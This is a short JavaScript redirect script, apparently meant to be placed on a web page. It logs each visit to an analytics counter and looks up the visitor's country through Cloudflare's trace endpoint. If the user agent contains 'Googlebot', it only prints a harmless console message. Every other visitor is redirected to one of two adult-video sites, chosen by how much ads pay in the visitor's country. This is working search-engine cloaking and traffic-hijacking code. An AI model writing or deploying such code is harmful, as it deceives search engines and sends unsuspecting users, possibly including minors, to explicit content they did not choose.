const HIGH_CPM_URL = "https://livesexvideo.pages.dev";
const LOW_CPM_URL  = "https://xvideoshub.pages.dev";
const GOATCOUNTER_URL = "https://xnxxhot.goatcounter.com/count";
const LOOKUP_TIMEOUT_MS = 800; // give up on the country lookup after this

const HIGH_CPM_COUNTRIES = [
  "US", "CA", "GB", "AU", "NZ", "DE", "FR", "NL", "CH",
  "SE", "NO", "DK", "FI", "IE", "AT", "BE", "SG", "JP", "AE"
];

// ---------- Count the visit (does not block the redirect) ----------
function countVisit() {
  try {
    var id = new URLSearchParams(location.search).get("id");
    var path = id ? "/" + id + ".html" : location.pathname;
    var url = GOATCOUNTER_URL +
      "?p=" + encodeURIComponent(path) +
      "&t=" + encodeURIComponent(document.title) +
      "&r=" + encodeURIComponent(document.referrer) +
      "&rnd=" + Math.random().toString(36).slice(2);
    // keepalive lets the request finish even after the page redirects
    fetch(url, { mode: "no-cors", keepalive: true });
  } catch (e) {}
}

// ---------- Country lookup with timeout ----------
async function getCountry() {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), LOOKUP_TIMEOUT_MS);
  try {
    const res = await fetch("https://www.cloudflare.com/cdn-cgi/trace", {
      signal: controller.signal
    });
    const text = await res.text();
    const match = text.match(/loc=([A-Z]{2})/);
    return match ? match[1] : null;
  } catch (e) {
    return null;
  } finally {
    clearTimeout(timer);
  }
}

// ---------- Run ----------
(async () => {
  countVisit();

  if (navigator.userAgent.includes("Googlebot")) {
    console.log("Thanks for visiting my page");
    return;
  }

  const country = await getCountry();
  const target = HIGH_CPM_COUNTRIES.includes(country) ? HIGH_CPM_URL : LOW_CPM_URL;
  window.location.href = target;
})();
